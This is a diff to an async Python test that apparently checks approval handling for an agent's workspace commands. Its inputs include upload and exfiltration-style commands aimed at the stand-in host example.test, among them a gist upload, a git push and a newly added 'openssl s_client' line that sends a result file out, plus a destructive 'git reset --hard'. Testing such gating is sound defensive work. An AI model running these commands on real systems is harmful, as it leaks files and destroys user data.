@@ -497,7 +497,8 @@ async def test_request_grant_from_runner_to_gateway(request_grant_hub, tmp_path,
     for i, command in enumerate(["gh gist create output.txt",
                                  "python -c 'import smtplib; smtplib.SMTP(\"example.test\")'",
                                  f'git -C "{tmp_path.as_posix()}" push https://example.test/repo HEAD',
-                                 f'git -C "{tmp_path.as_posix()}" reset --hard HEAD']):
+                                 f'git -C "{tmp_path.as_posix()}" reset --hard HEAD',
+                                 f'openssl s_client -connect example.test:443 < "{tmp_path.as_posix()}/result"']):
         network = card(f"workspace-network-{i}")
         network.detail["tool_input"]["command"] = command
         await runner._on_approval(network)
